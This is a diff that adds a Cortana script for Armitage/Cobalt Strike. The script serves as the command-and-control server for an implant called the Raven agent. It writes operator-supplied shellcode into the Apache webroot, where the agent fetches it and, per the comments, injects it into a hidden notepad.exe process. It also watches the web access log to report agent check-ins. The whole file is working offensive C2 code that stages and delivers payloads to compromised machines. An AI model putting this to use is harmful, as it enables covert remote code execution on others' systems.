@@ -1,0 +1,65 @@
+#
+# = A server to manage the Raven agent =
+#
+# This script acts as middleware to integrate the Raven agent's C2
+# into the Armitage and Cobalt Strike collaboration architecture.
+#
+# It subscribes to commands published by client.cna. These commands
+# are then made available to the Raven agent. It also publishes Raven 
+# checkin information for client.cna to consume. 
+#
+# The Raven agent consumes files from a webserver. It assumes these
+# files contain shellcode and injects their contents into a hidden
+# notepad.exe process. 
+#
+# To use this script, you must start the Apache web server and set
+# $WEBROOT and $WEBLOG to point to the appropriate places.
+#
+# You may run server.cna in Armitage or through cortana.jar.
+#
+
+global('$WEBROOT $WEBLOG');
+
+# where are your web files served from? 
+$WEBROOT = "/var/www/";
+
+# where is your Apache2 access.log?
+$WEBLOG = "/var/log/apache2/access.log"
+
+# this event fires when a command is published by client.cna
+on raven_command {
+	local('$file $shellcode $handle');
+	($file, $shellcode) = $1;
+
+	if ($shellcode eq "") {
+		deleteFile(getFileProper($WEBROOT, $file));
+	}
+	else {
+		$handle = openf("> $+ $WEBROOT $+ $file");
+		writeb($handle, $shellcode);
+		closef($handle);
+	}
+}
+
+# Cortana does not like blocking. If you're going to perform an action that blocks, use
+# &fork to create a new thread that performs the blocking activity. You can communicate 
+# with the rest of your script by firing a local event from your fork. Or you can make 
+# info available globally by publishing information from your fork.
+fork({
+	local('$handle $text $host $uri $status $size');
+
+	# we're going to watch the weblog with tail. *pHEAR*
+	$handle = exec("tail -f $WEBLOG");
+
+	while $text (readln($handle)) {
+		if ($text ismatch '(.*?) - - .*? \\"GET (.*?) HTTP.1..\\" (\\d+) (\\d+) .*') {
+			($host, $uri, $status, $size) = matched();
+
+			# publish information on our checkin for client.cna to consume
+			publish("raven_checkin", %(host => $host, uri => $uri, status => $status, size => $size));
+		}
+	}
+});
+
+# subscribe to any commands client.cna publishes. Check every 10s for new ones.
+subscribe('raven_command', '', '10s');
